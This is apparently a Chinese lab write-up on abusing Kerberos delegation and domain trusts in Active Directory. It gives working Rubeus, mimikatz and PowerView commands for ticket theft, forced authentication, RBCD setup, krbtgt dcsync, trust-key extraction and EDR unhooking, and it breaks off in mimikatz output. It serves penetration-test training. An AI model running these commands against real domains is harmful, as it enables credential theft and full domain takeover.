<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户-&gt;web服务器-&gt;数据库</span><br></pre></td></tr></table></figure>

<p>只需要在web服务器提供一次用户自己凭证，后续当用户通过web服务器执行需要鉴权的数据库查询或其他需要凭证才能访问的服务时，web服务器会将一开始获取到的用户凭证提供给后端服务。</p>
<p>委托的目的就是模拟用户</p>
<h4 id="1-无约束委派-Unconstrained-Delegation"><a href="#1-无约束委派-Unconstrained-Delegation" class="headerlink" title="1.无约束委派 Unconstrained Delegation"></a>1.无约束委派 Unconstrained Delegation</h4><p>流程如下</p>
<ul>
<li>1.用户发送凭证给DC</li>
<li>2.DC返回TGT</li>
<li>3.用户向DC请求 webserver 的TGS</li>
<li>4.DC提供一个TGS</li>
<li>5.用户拿着自己的TGT和TGS都发送给webserver </li>
<li>6.webserver为了访问后端，用用户的TGT向DC请求访问sqlserver的TGS</li>
<li>7.webserver拿到TGS，以用户身份请求sqlserver.</li>
</ul>
<p>第6步DC唯一验证TGT有没有效的方式是看Kdc能不能正常解密它。</p>
<p>这无约束委派的流程中里有几个可利用点，首先是第3步 <code>用户会把自己的TGT发送给服务</code>，这代表如果有一个攻击者伪造的服务，用户与伪造服务进行非约束委派时会把自己TGT发送过去。</p>
<h5 id="1-枚举"><a href="#1-枚举" class="headerlink" title="1.枚举"></a>1.枚举</h5><p>枚举域内存在的非约束委派</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domaincomputer</span> <span class="literal">-unConstrained</span></span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> &#123;TrustedForDelegation <span class="operator">-eq</span> <span class="variable">$True</span>&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;TrustedForDelegation <span class="operator">-eq</span> <span class="variable">$True</span>&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-利用"><a href="#2-利用" class="headerlink" title="2.利用"></a>2.利用</h5><p>正常情况下需要等待用户对存在非约束委派的机器发起请求，然后再上去导出用户发送的票据。</p>
<p>Safetykatz</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;sekurlsa::tickets /export&quot;</span></span><br></pre></td></tr></table></figure>

<p>注入票据到当前进程</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;kerberos::ptt C:\users\appadmin\Documents\user1\[0;2ceb8b31-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>但是一直等也不太现实，所以可以采用强制请求的方式，截至2025年，目前有以下几种方式</p>
<table>
<thead>
<tr>
<th>Protocol</th>
<th>Service</th>
<th>Default on Server Os</th>
<th>Ports Required</th>
</tr>
</thead>
<tbody><tr>
<td>MS-RPRN</td>
<td>Print Spooler</td>
<td>YES</td>
<td>445 (SMB)</td>
</tr>
<tr>
<td>MS-WSP</td>
<td>Windows Search</td>
<td>No(default on clientOS)</td>
<td>445 (SMB)</td>
</tr>
<tr>
<td>MS-DFSNM(MDI detects this)</td>
<td>DFS Namespaces</td>
<td>No</td>
<td>445 (SMB)</td>
</tr>
</tbody></table>
<p>（其实还有小河马）</p>
<p>在实验lab中，dcorp-appsrv启用了非约束委派，所以可以利用它来做。</p>
<p>首先在dcorp-appsrv机器上起一个监听，（注意需要有本地管理员权限才可以）。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/">https://www.hackingarticles.in/a-detailed-guide-on-rubeus/</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:<span class="number">5</span> /nowrap</span><br></pre></td></tr></table></figure>

<p>因为这里仅关注DC机器，所以指定targetuser</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:<span class="number">5</span> /targetuser:DCORP<span class="literal">-DC</span><span class="variable">$</span> /nowrap </span><br></pre></td></tr></table></figure>

<p>然后使用 <code>MS-RPRN.exe</code> 强制域控 <code>dcorp-dc</code>对主机 <code>dcorp-appsrv</code> 发送请求</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS<span class="literal">-RPRN</span>.exe \\dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local \\dcorp<span class="literal">-appsrv</span>.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>之后Rubeus的监控将会base64的TGT，将其导出，到本地注入到进程中。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:xxx</span><br></pre></td></tr></table></figure>

<p>之后便可以用域控主机乱搞，比如dcsync拿krbtgt的aeskey做金票或钻石票之类等等</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /user:krbtgt&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>类似的还有MS-DFSNM，也是强制dc访问appsrv的445端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-约束委派-Constrained-Delegation"><a href="#2-约束委派-Constrained-Delegation" class="headerlink" title="2.约束委派 Constrained Delegation"></a>2.约束委派 Constrained Delegation</h4><p>约束委派在2008年引入</p>
<p>目的其一，是为了解决用户端使用非kerberos协议与前端webserver进行身份认证（比如表单认证等），webserver会将收到的表单认证等，转换为kerberos协议以方便与后端的服务交互。</p>
<p>目的其二，与 <code>非约束委派</code> 场景下允许用户从任何服务做第一跳，然后第一跳的服务替用户向任何服务发起第二跳的委派不同。</p>
<p>约束委派仅允许用户从指定的第一跳的服务（UAC位有TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION）上发起第二跳，而且第二跳的范围受第一跳服务的访问服务范围限制，第二跳仅允许访问指定服务器上指定的服务资源。  </p>
<p>同时在这个阶段，为了支持约束委派引入了两个新的拓展协议 <code>S4U2Self</code> 和 <code>S4U2Proxy</code></p>
<h5 id="S4U2Self"><a href="#S4U2Self" class="headerlink" title="S4U2Self"></a>S4U2Self</h5><p>webserver（前端）服务替用户向dc请求一张由用户访问服务自身的<strong>可转发票据</strong>，DC检查当前服务账户的UAC是否有<code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> 位，然后检查被模拟的用户账户是否被允许委派，如果两者皆都满足则返回票据，<strong>注意，服务以用户身份向dc请求访问到自身票据时不需要提供任何用户凭证</strong>，仅需告知DC发起请求的用户即可。</p>
<p><strong>可利用点：</strong></p>
<ul>
<li>如果一个有<code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> 位的服务账户被控制，那将可以通过S4U2Self获取到域内任何人（在域内账户都被允许发起委派的情况下）访问到自己的可转发票据，然后再通过S4U2proxy获取到以用户身份访问到第二跳服务账户的票据。</li>
</ul>
<h5 id="S4U4Proxy"><a href="#S4U4Proxy" class="headerlink" title="S4U4Proxy"></a>S4U4Proxy</h5><p>webserver服务使用刚S4U2Self获取的可转发票据，向DC请求一张访问后端服务的票据，DC将检查当前服务的 <code>msDS-AllowedToDelegateTo</code> 字段，如果字段中指向当前要获取的后端服务，则返回一张访问后端服务的票据，现在webserver能以用户身份访问后端。</p>
<p><strong>可利用点：</strong></p>
<ul>
<li>如果<strong>有能力修改当前账户 <code>msDS-AllowedToDelegateTo</code> 字段内的SPN</strong>，则可以自定义该字段，实现向任何带有SPN的机器发起委派请求，也就是说可以访问到域内任何有SPN的机器的任何服务。</li>
</ul>
<h5 id="1-寻找启用了约束委派的用户或机器"><a href="#1-寻找启用了约束委派的用户或机器" class="headerlink" title="1.寻找启用了约束委派的用户或机器"></a>1.寻找启用了约束委派的用户或机器</h5><p>查询开启约束委派的用户</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainUser</span> <span class="literal">-TrustedToAuth</span></span><br></pre></td></tr></table></figure>

<p>查询开启约束委派的机器</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainComputer</span> <span class="literal">-TrustToAuth</span></span><br></pre></td></tr></table></figure>
<hr>
<p>查询所有 <code>ms-AllowedToDelegateTo</code> 不为空的账户</p>
<p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObject |?&#123;$_.&quot;msds-allowedtodelegateto&quot; -ne $null&#125;|select name,msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADObejct</span> <span class="literal">-Filter</span> &#123;ms<span class="literal">-AllowedToDelegateTo</span> <span class="operator">-ne</span> <span class="string">&quot;<span class="variable">$null</span>&quot;</span> &#125; <span class="literal">-Properties</span> ms<span class="literal">-AllowedToDelegateTo</span></span><br></pre></td></tr></table></figure>

<h5 id="2-利用-S4U2Self-S4U2Proxy-访问服务"><a href="#2-利用-S4U2Self-S4U2Proxy-访问服务" class="headerlink" title="2.利用 S4U2Self + S4U2Proxy 访问服务"></a>2.利用 S4U2Self + S4U2Proxy 访问服务</h5><p>模拟目标账户通过<code>S4U2Self + S4U2Proxy</code>获取可委派服务<code>(ms-AllowedToDelegateTo)</code>的票据 </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:websvc /aes256:xxxxxxxx /impersonateuser:Administrator /msdsspn:CIFS/dcorp<span class="literal">-mssql</span>.dollarcorp.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>

<p>现在可以用被注入票据的进程，发起对的目标访问</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> \\dcorp<span class="literal">-mssql</span>.dollarcorp.moneycorp.local\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>

<h5 id="3-服务器名称不变-通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务"><a href="#3-服务器名称不变-通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务" class="headerlink" title="3.服务器名称不变 通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务"></a>3.服务器名称不变 通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务</h5><p><a target="_blank" rel="noopener" href="https://twitter.com/agsolino">Alberto Solino’s</a>发现，在一张KrbCred(krb凭据)中，只有服务器名是受是加密校验保护的，凭证中的服务名可以随意修改，所以只要目标服务器对应的 SPN 被授权了，就通过修改票据的服务名的字段使用这张票访问目标服务器原本不该访问的资源。</p>
<p>这里用原本只允许当前服务委派DC的 <code>time</code> SPN，但是对面DC开放了 <code>ldap</code>的SPN ，就可以修改S4U2Proxy回来票据中的 <code>time</code> 改为 <code>ldap</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:dcorp<span class="literal">-adminsrv</span><span class="variable">$</span> /aes256:xxxxxxxxx /impersonateuser:Administrator /msdsspn:time/dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /altservice:ldap /ptt </span><br></pre></td></tr></table></figure>

<h5 id="4-利用-S4U2Self-伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务"><a href="#4-利用-S4U2Self-伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务" class="headerlink" title="4. 利用 S4U2Self 伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务"></a>4. <del>利用 S4U2Self 伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务</del></h5><p>其实是写的时候想到的，查了下有类似的，不过我还没试过。。等之后尝试ok了再写这部分</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://exploit.ph/revisiting-delegate-2-thyself.html">https://exploit.ph/revisiting-delegate-2-thyself.html</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /self /user:websvc /aes256:xxxxxxxx /impersonateuser:Administrator /msdsspn:xxxx/websvc.dollarcorp.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>

<h4 id="3-基于资源的约束委派-RBCD"><a href="#3-基于资源的约束委派-RBCD" class="headerlink" title="3.基于资源的约束委派 RBCD"></a>3.基于资源的约束委派 RBCD</h4><p>在约束委派中，只有DA或有权限的对象才能编辑服务账户 <code>msDS-AllowedToDelegateTo</code> 属性，DC验证当前发起委派服务账户的 <code>msDS-AllowedToDelegateTo</code> 属性是否包含当前要委派至的目标服务.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">委派服务账户 （ms-AllowedToDelegateTo:cifs/test.aaa.local） -&gt; s4u2proxy- &gt; 服务/后端服务器 （cifs/test.aaa.local）</span><br></pre></td></tr></table></figure>

<p>而基于资源的约束委派（RBCD）将委派配置权限给到了服务自身，发起端的 <code>msDs-AllowedToDelegatTo</code> 属性不再是必须的，由服务账户或服务管理员自己配置服务账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性 ，允许哪些服务对自己发起委派，委派至哪个服务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">委派服务账户（svc1） -&gt; s4u2proxy -&gt; 服务账户（msDS-AllowedToActOnBehalfOfOtherIdentity:svc1）</span><br></pre></td></tr></table></figure>

<h5 id="1-利用点"><a href="#1-利用点" class="headerlink" title="1.利用点"></a>1.利用点</h5><p>如果对于一个高价值服务账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 有写入权限，则可以将其变更指向到一个<strong>当前控制住的</strong> <code>有SPN的账户</code> 或 <code>机器账户</code>，然后通过这个被控制的账户发起委派伪造用户即可。</p>
<p>如果当前没有控制到符合 <code>有SPN的账户</code> 或 <code>机器账户</code> 条件的账户，则可以用当前域用户添加 <code>域机器账户</code> ，通常来说一个账户允许最多添加10个域机器账户，能添加夺少台取决于域的 <code>ms-DS-MachineAccountQuota</code> 属性，而被这个用户加进来的机器账户是onwer权限。</p>
<p>加机器账户可以这样</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount xxxx&lt;machine name&gt; -Password $(ConvertTo-SecureString &#x27;P4ssword123!&#x27; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>

<h5 id="2-配置-msDS-AllowedToActOnBehalfOfOtherIdentity-字段"><a href="#2-配置-msDS-AllowedToActOnBehalfOfOtherIdentity-字段" class="headerlink" title="2.配置 msDS-AllowedToActOnBehalfOfOtherIdentity 字段"></a>2.配置 msDS-AllowedToActOnBehalfOfOtherIdentity 字段</h5><p>用权限足够的用户修改添加能控制住的机器到目标的约束委派字段（<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>）</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-domainRBCD</span> <span class="literal">-Identity</span> dcorp<span class="literal">-mgmt</span> <span class="literal">-DelegateFrom</span> <span class="string">&#x27;student1$&#x27;</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#弄完之后可以再查看一下</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-domainRBCD</span></span><br></pre></td></tr></table></figure>

<p>也可以通过这样查看rbcd字段指向的sid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rawBytes =(Get-DomainObject -Identity &quot;dcorp-mgmt&quot;).&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span><br><span class="line">(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).</span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里只是为了演示能加多个，实际只用了一个</span></span><br><span class="line"><span class="variable">$comps</span> = <span class="string">&#x27;dcorp-student1$&#x27;</span>,<span class="string">&#x27;dcorp-student2$&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ADComputer</span> <span class="literal">-Identity</span> dcorp<span class="literal">-mgmt</span> <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> <span class="variable">$comps</span></span><br></pre></td></tr></table></figure>

<p>再提取对应被控制机器的aeskey，一会用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-mimikatz</span> <span class="literal">-Command</span> <span class="string">&#x27;&quot;sekurlsa::ekeys&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用被控账户发起委派至目标( S4U2self + S4U2Proxy )，获取目标上高权用户的访问票据，注入到进程</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:dcorp<span class="literal">-student1</span><span class="variable">$</span> /aes256:xxxxxxxxx /msdsspn:http/dcorp<span class="literal">-mgmt</span> /impersonateuser:Administrator /ptt</span><br></pre></td></tr></table></figure>

<p>访问到远程主机</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:dcorp<span class="literal">-mgmt</span> cmd.exe</span><br></pre></td></tr></table></figure>

<h3 id="10-跨域-Across-Trusts"><a href="#10-跨域-Across-Trusts" class="headerlink" title="10.跨域 Across Trusts"></a>10.跨域 Across Trusts</h3><p>跨域请求服务的流程</p>
<ul>
<li>1.客户端时间戳与用户密钥加密发送到子域KDC(as-req)</li>
<li>2.子域KDC使用krbtgt加密TGT，然后发送给用户(as-rep)</li>
<li>3.客户端用TGT向KDC请求访问服务的ST(tgs-req)</li>
<li>4.KDC首先会检查客户端请求的服务主体是否在自己域内，如果不在自己域内，KDC将返回一张跨域票据（inter-realm referral TGT）<!-- 注意这张票据的内层是由目标域的 `krbtgt key` 加密的，并非本域 `krbtgt`  -->，而这张票据的最外层是由跨域信任密钥 <code>trust key</code> 加密的 <del>（如果在自己域内的话就走正常的tgs-rep了，KDC用服务的凭证加密ST，然后返回一张ST给客户端，虽然放在跨域这里部分并不重要但我还是写上了XD）</del>(tgs-rep)</li>
<li>5.客户端使用第四步获取的跨域TGT，向服务所在域的DC请求服务ST，在这一步父域DC验证票据是否 可用的唯一标准是用户的跨域TGT能否被跨域密钥 <code>trust key</code> 解密。</li>
<li>6.如果能被成功解密，父域或者目标域的kdc将会响应给客户端一张对应的服务票据（ST），<strong>这张票据由 <code>Trust key</code> 加密。</strong></li>
<li>7.然后就可以访问跨域服务了</li>
</ul>
<p>在有域管理的情况下有多种方式获取到企业管理员 <code>Enterprise Admins</code> 权限</p>
<p>比如，第6步的 跨域信任密钥 <code>trust key</code> 在可信的域控之间设置是始终相同的，只需要得到 <code>trust key</code> 就可以直接伪造第5步的TGT。</p>
<p>要利用这一点，需要首先从当前所属域DC提取 <code>trust key</code> 的rc4 key，然后伪造 <code>referral tgt</code>，在其中票据中注入<code>sid history</code>属性，<code>sid history</code> 安全标识符指向 <code>519</code>（即企业管理员）。</p>
<h4 id="1-SID-history"><a href="#1-SID-history" class="headerlink" title="1.SID history"></a>1.SID history</h4><p><code>sid history</code> 是为了用户从一个域移动到另一个域而设计的用户属性，当用户移动到一个新域时他会获得到一个新的sid(sid的前段是当前域sid，后段是域内账户的标识符sid)，而用户旧的域sid将会被复制到属性中或者添加到 <code>sid history</code> 属性中，利用这个特点有两种方式可以提升到企业管理员。</p>
<ul>
<li>1.使用 <code>trust key</code> 伪造第5步使用的跨域TGT，并注入 <code>sid history</code></li>
<li>2.在本域使用 <code>krbtgt key</code> 伪造金票时多加个<code>sid history</code> 属性（与正常金票节点一样只是伪造TGT的时候多加了个sid history字段）</li>
</ul>
<h5 id="1-提取trust-key"><a href="#1-提取trust-key" class="headerlink" title="1.提取trust key"></a>1.提取trust key</h5><p>利用跨域信任密钥伪造跨域票据（referral TGT）写入 <code>sid history</code>，首先从子节点DC获取 <code>trust key</code>，这里有多种方式：</p>
<ul>
<li>枚举 Active Directory 域之间的信任关系，会返回信任密钥，<strong>这个 <code>lsadump::trust</code> 需要在域控上执行</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe &quot;lsadump::trust /patch&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>dcsync提取域信任账户的hash</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe &quot;lsadump::dcsync /user:dcorp\mcorp$&quot;</span><br></pre></td></tr></table></figure>

<p>下面的 <code>e83dbf0e81faf41fee25704eb60b4f26</code> 就是信任密钥 </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svcadmin&gt; .\loader.exe <span class="literal">-path</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/safetykatz.exe <span class="literal">-args</span> <span class="string">&quot;lsadump::evasive-trust /patch&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">.\loader.exe <span class="literal">-path</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/safetykatz.exe <span class="literal">-args</span> <span class="string">&quot;lsadump::evasive-trust /patch&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/safetykatz.exe Arguments : lsadump::evasive<span class="literal">-trust</span> /patch <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::evasive-trust /patch</span></span><br><span class="line"></span><br><span class="line">Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span>)</span><br><span class="line"></span><br><span class="line">Domain: MONEYCORP.LOCAL (mcorp / S<span class="literal">-1-5-21-335606122-960912869-3279953914</span>)</span><br><span class="line"> [  <span class="type">In</span> ] DOLLARCORP.MONEYCORP.LOCAL -&gt; MONEYCORP.LOCAL</span><br><span class="line">    * <span class="number">5</span>/<span class="number">13</span>/<span class="number">2025</span> <span class="number">2</span>:<span class="number">03</span>:<span class="number">17</span> PM - <span class="built_in">CLEAR</span>   - ec <span class="number">0</span>b <span class="number">6</span>f <span class="number">21</span> <span class="number">07</span> <span class="number">77</span> <span class="number">7</span>e <span class="number">8</span>c bd <span class="number">78</span> <span class="number">8</span>a <span class="number">45</span> <span class="number">8</span>e <span class="number">38</span> <span class="number">3</span>e <span class="number">11</span> fa <span class="number">9</span>b <span class="number">80</span> <span class="number">83</span> d9 <span class="number">9</span>a ed <span class="number">93</span> <span class="number">1</span>b <span class="number">4</span>d e8 d3 <span class="number">4</span>e dd <span class="number">02</span> <span class="number">70</span> <span class="number">75</span> b5 e4 <span class="number">58</span> <span class="number">4</span>a c3 b8 <span class="number">53</span> <span class="number">53</span> cc ce <span class="number">97</span> <span class="number">63</span> <span class="number">69</span> aa b3 <span class="number">11</span> <span class="number">18</span> <span class="number">32</span> <span class="number">81</span> c8 <span class="number">0</span>d <span class="number">9</span>a f3 <span class="number">86</span> b4 df <span class="number">91</span> <span class="number">6</span>e b1 <span class="number">6</span>c f1 <span class="number">66</span> <span class="number">67</span> <span class="number">20</span> ab ae d8 <span class="number">9</span>b a7 <span class="number">6</span>f <span class="number">7</span>c ab <span class="number">2</span>c <span class="number">70</span> <span class="number">28</span> be f0 e3 <span class="number">60</span> <span class="number">1</span>a ce <span class="number">2</span>b <span class="number">7</span>b <span class="number">06</span> <span class="number">3</span>a <span class="number">3</span>b <span class="number">5</span>b <span class="number">82</span> d5 <span class="number">66</span> <span class="number">22</span> ae a0 f0 <span class="number">83</span> <span class="number">9</span>c <span class="number">3</span>c <span class="built_in">fc</span> cc c9 <span class="number">5</span>f <span class="number">8</span>f <span class="number">7</span>a f8 <span class="number">00</span> dd d7 <span class="number">5</span>e <span class="number">8</span>f ce <span class="number">60</span> c8 f9 <span class="number">93</span> <span class="number">43</span> <span class="number">5</span>f <span class="number">65</span> <span class="number">60</span> b5 b3 <span class="number">41</span> <span class="number">0</span>e <span class="number">38</span> <span class="number">5</span>c cc <span class="number">01</span> <span class="number">82</span> ff e1 <span class="number">72</span> b1 e4 <span class="number">60</span> ea <span class="number">99</span> <span class="number">0</span>e <span class="number">63</span> <span class="number">2</span>c <span class="number">89</span> ef <span class="number">2</span>e <span class="number">55</span> <span class="number">68</span> dc ea <span class="number">83</span> c8 <span class="number">00</span> c7 <span class="number">3</span>c d9 f7 a5 b4 <span class="number">6</span>d <span class="number">2</span>f <span class="number">52</span> <span class="number">0</span>c <span class="number">6</span>e ab <span class="number">96</span> c8 <span class="number">37</span> <span class="number">47</span> <span class="number">9</span>a <span class="number">31</span> f6 <span class="number">5</span>e <span class="number">27</span> cc c8 b5 <span class="number">24</span> <span class="number">0</span>d f0 fb <span class="number">4</span>d d1 <span class="number">03</span> <span class="number">4</span>c f7 a1 f8 <span class="built_in">ac</span> f1 c4 b8 <span class="number">71</span> <span class="number">5</span>a b6 <span class="number">98</span> af <span class="number">7</span>f <span class="number">1</span>a <span class="number">6</span>b <span class="number">51</span> bf <span class="number">67</span> bc <span class="number">2</span>c e3 <span class="number">06</span> ed <span class="number">18</span> c6 <span class="built_in">ac</span> <span 